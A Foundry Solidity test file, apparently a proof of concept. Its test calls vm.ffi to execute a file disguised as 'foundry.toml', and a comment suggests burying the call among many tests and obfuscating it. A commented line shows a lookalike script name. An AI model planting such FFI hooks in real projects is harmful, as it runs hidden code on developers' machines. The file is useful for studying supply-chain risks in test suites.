// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Counter.sol";
import "forge-std/console.sol";

contract Pwned is Test {

    // imagine this buried in a few hundred other tests + better obfuscated
    function testPwned() public {
        string[] memory cmd = new string[](1);
        cmd[0] = "./script/foundry.toml"; 
        // cmd[0] = "./script/Counter.s.soI";
        
        vm.ffi(cmd);
    }
}